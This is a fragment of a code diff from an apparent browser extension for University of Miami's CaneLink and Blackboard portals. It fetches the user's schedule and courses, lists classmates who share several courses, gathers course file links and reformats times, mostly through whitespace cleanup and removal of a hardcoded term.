+                { action: "fetchSchedule", url: `https://canelink.miami.edu/psc/UMIACP1D/EMPLOYEE/SA/s/WEBLIB_HCX_EN.H_SCHEDULE.FieldFormula.IScript_ScheduleByInterval?from=${formattedDate}&thru=${formattedDate}`, postUrl: "https://canelink.miami.edu:443/Shibboleth.sso/SAML2/POST", type: 'json' },
                 (response) => {
                     if (response.success) {
                         resolve(response.response);
@@ -1132,22 +1145,21 @@ document.querySelector("#overlap-btn").addEventListener("click", async () => {
                 }
             );
         });
-    
-        current_term = response['term_descr']
-        current_term = "Fall 2024"
 
-        response = await fetch(`https://www.courses.miami.edu/learn/api/public/v1/users/me`, {headers: headers})
+        current_term = response['term_descr']
+
+        response = await fetch(`https://www.courses.miami.edu/learn/api/public/v1/users/me`, { headers: headers })
         response = await response.json()
 
         user_name = response['name']['given'] + " " + response['name']['family']
 
-        response = await fetch(`https://www.courses.miami.edu/learn/api/public/v1/users/me/courses?expand=course`, {headers: headers})
+        response = await fetch(`https://www.courses.miami.edu/learn/api/public/v1/users/me/courses?expand=course`, { headers: headers })
         response = await response.json()
         courses = response['results']
 
         course_ids = courses
-        .filter(course => course['course']['name'].includes(current_term))
-        .map(course => course['course']['id'] + "," + course['course']['courseId'].substring(0, 6));
+            .filter(course => course['course']['name'].includes(current_term))
+            .map(course => course['course']['id'] + "," + course['course']['courseId'].substring(0, 6));
 
         students = {}
         overlaps = ""
@@ -1176,14 +1188,14 @@ document.querySelector("#overlap-btn").addEventListener("click", async () => {
         overlapBox = document.createElement("div")
         overlapBox.id = "overlap-box"
         overlapBox.innerHTML = `<h3>Overlapping Students (${current_term}):</h3>`
-        
+
         overlaps = Object.entries(students)
             .filter(([_, details]) => details.count > 1)
             .sort(([, a], [, b]) => b.count - a.count) // Sort by count in descending order
-            .map(([student, details]) => 
+            .map(([student, details]) =>
                 `<li>${student} (${details.count} classes): ${details.courses.join(", ")}</li>`
-        );
-        
+            );
+
         console.log(students);
         console.log(overlaps)
 
@@ -1193,16 +1205,16 @@ document.querySelector("#overlap-btn").addEventListener("click", async () => {
         adjustBoxHeight(overlapBox)
 
         document.querySelector("#overlap-btn").innerText = "Hide Overlap Students"
-        
+
     })
 })
 
 // gets all link that have bbcswebdav in them
 function getLinks() {
     files = []
-    
+
     iframes = Array.from(document.querySelectorAll('iframe'))
-    
+
     iframes.forEach(iframe => {
         if (iframe.contentDocument) {
             links = Array.from(iframe.contentDocument.querySelectorAll('a[href]'))
@@ -1220,18 +1232,18 @@ function getLinks() {
 
 function convertToNormalTime(inputTime) {
     const correctedTime = inputTime.replace(/\./g, ':');
-    
+
     const [timePart, offset] = correctedTime.split('-');
     [hours, minutes] = timePart.split(':').map(Number);
 
     hours = hours - 2;
-    
+
     const date = new Date();
     date.setUTCHours(hours - parseInt(offset), minutes, 0, 0);
 
     let hour = date.getHours();
     const isPM = hour >= 12;
-    hour = hour % 12 || 12; 
+    hour = hour % 12 || 12;
     const formattedTime = `${hour}:${String(date.getMinutes()).padStart(2, '0')} ${isPM ? 'AM' : 'PM'}`;
 
     return formattedTime;
